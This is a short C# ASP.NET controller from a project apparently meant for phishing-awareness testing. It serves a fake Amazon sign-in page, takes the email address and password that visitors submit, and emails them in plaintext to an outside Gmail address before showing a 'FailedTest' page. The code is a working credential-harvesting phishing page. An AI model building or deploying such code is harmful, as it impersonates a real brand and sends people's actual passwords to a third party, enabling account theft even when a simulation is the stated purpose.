using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using PhishingTest.Models.Models;
using PhisingTest.BusinessLayer.Services;

// For more information on enabling MVC for empty projects, visit http://go.microsoft.com/fwlink/?LinkID=397860

namespace PhisingTest.Controllers
{
    public class PhishingPageController : Controller
    {
        private readonly IEmailService _EmailService;

        public PhishingPageController(IEmailService emailService)
        {
            _EmailService = emailService;
        }

        [Route("amazonsignin", Name = "AmazonSignin")]
        public IActionResult AmazonSignIn()
        {
            return View("Amazon");
        }

        [HttpPost]
        public IActionResult GetCredentials(Credential creds)
        {
            if (!ModelState.IsValid)
            {
                return RedirectToAction("Amazon");
            }

            SendCredentials(creds);
            return View("FailedTest");
        }

        private void SendCredentials(Credential creds)
        {
            _EmailService.SendEmailAsync("johnd.zartis@gmail.com", "Credentials Comprimised", $"Email: {creds.Email}\nPassword: {creds.Password}");
        }
    }
}
